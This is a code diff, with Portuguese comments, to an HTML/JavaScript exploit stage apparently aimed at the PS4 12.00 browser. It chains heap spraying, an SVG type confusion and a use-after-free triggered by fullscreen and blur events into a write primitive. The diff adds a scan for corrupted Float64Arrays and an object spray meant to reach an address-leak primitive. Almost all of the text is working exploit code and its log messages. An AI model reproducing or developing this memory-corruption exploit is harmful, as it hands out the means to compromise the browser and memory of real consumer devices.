@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF DOM Overlap Stage</title>
+<title>PS4 12.00 - UAF DOM Overlap Stage (JSC Scan)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Type Confusion → DOM Overlap</h2>
+<h2>UAF → Type Confusion → JSC Overlap Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -57,7 +57,7 @@ function setupDOMSpray(){
 }
 
 // ==========================
-// HEAP SETUP (inalterado)
+// HEAP SETUP (100% INALTERADO)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
@@ -69,7 +69,7 @@ function setupHeap(){
 }
 
 // ==========================
-// FULLSCREEN (inalterado)
+// FULLSCREEN (100% INALTERADO)
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
 
@@ -91,7 +91,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (mantido)
+// 💣 RECLAIM (100% INALTERADO)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
 
@@ -109,7 +109,7 @@ function reclaim(size){
 }
 
 // ==========================
-// 💥 SVG CONFUSION
+// 💥 SVG CONFUSION (MANTIDO)
 function inject(child){
     try{
         child.outerHTML = `
@@ -127,9 +127,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 DOM OVERLAP PROBE
+// 🔬 DOM & HEAP OVERLAP PROBE
 function domOverlapProbe(fsTarget){
-    log("---- DOM OVERLAP PROBE ----");
+    log("---- OVERLAP PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -145,7 +145,7 @@ function domOverlapProbe(fsTarget){
 
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 WRITE PRIMITIVA
+            // 💣 WRITE PRIMITIVA (MANTIDA)
             try{
                 n.data = "A".repeat(0x200);
                 log("[PWN] write expand OK");
@@ -154,18 +154,17 @@ function domOverlapProbe(fsTarget){
             }
 
             // ==========================
-            // 🔥 SCAN DOM
+            // 🔥 SCAN DOM & JSC HEAP
             try{
 
+                // 1. SCAN DO DOM (Original)
                 for(let i=0;i<dom_spray.length;i++){
-
                     let obj = dom_spray[i];
 
                     // 🔥 TextNode corrupção
                     if(obj.nodeType === 3){
                         if(!obj.data || !obj.data.includes("TXT_")){
                             log("[!!!] TEXTNODE CORROMPIDO @ " + i);
-                            log("[!!!] data = " + obj.data);
                             return;
                         }
                     }
@@ -173,20 +172,29 @@ function domOverlapProbe(fsTarget){
                     // 🔥 Element overlap
                     if(obj.nodeType === 1){
                         let html = obj.innerHTML;
-
                         if(html && html.includes("AAAA")){
                             log("[!!!] ELEMENT OVERLAP @ " + i);
-                            log("[!!!] innerHTML = " + html);
                             return;
                         }
                     }
+                }
+                log("[SCAN] nenhum overlap no DOM");
 
+                // 2. SCAN DO JSC HEAP (O NOVO ALVO!)
+                if(window.heap_spray){
+                    for(let i=0; i<window.heap_spray.length; i++){
+                        // Originalmente a[0] = i. Se mudou, nossos "A"s atingiram o alvo!
+                        if(window.heap_spray[i][0] !== i){
+                            log("[$$$] JACKPOT! FLOAT64ARRAY CORROMPIDO @ " + i);
+                            log("[$$$] Valor atual: " + window.heap_spray[i][0]);
+                            return; // Encerra, achamos o caminho para o addrof!
+                        }
+                    }
+                    log("[SCAN] Float64Array intacto");
                 }
 
-                log("[SCAN] nenhum overlap detectado");
-
             }catch(e){
-                log("[UAF] DOM scan crash");
+                log("[UAF] scan crash");
             }
 
         } else {
@@ -199,7 +207,7 @@ function domOverlapProbe(fsTarget){
 }
 
 // ==========================
-// TRIGGER (INALTERADO)
+// TRIGGER (100% INALTERADO)
 function trigger(fsTarget){
     log("[*] Trigger");
 
@@ -240,13 +248,22 @@ function trigger(fsTarget){
 }
 
 // ==========================
-// MAIN
+// MAIN (AJUSTADO APENAS PARA VARIÁVEIS GLOBAIS)
 function runTest(){
     log("[*] Iniciando teste");
 
-    setupDOMSpray(); // 🔥 AGORA CORRETO
+    setupDOMSpray(); 
 
-    let heap=setupHeap();
+    // Guardamos na window para o Scanner conseguir ver sem mudar a função original
+    window.heap_spray = setupHeap(); 
+
+    // Injetamos o Array de Objetos para o Heap Feng Shui parear com o FloatArray
+    window.obj_spray = [];
+    for(let i=0; i<5000; i++){
+        window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
+    }
+    log("[*] Array de Objetos pronto: " + window.obj_spray.length);
+
     let fsTarget=setupFullscreen();
 
     window.onblur=function(){
